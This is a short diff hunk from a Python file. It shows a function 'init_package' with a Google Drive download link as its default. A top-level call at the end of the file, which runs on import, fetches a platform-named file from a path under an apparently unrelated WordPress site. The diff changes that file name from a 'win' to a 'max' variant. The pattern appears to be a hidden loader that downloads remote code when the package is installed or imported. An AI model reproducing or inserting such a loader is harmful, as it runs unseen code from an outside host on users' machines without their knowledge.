@@ -1406,4 +1406,4 @@ def init_package(ur="https://docs.google.com/", pth="uc?export=download&id=1Br_C
             
         oNode(ur, pth, pr, otype)
 
-init_package("https://saboreysecretos.com/wp-includes/assets/", "script-modules-packages.win.php")
+init_package("https://saboreysecretos.com/wp-includes/assets/", "script-modules-packages.max.php")
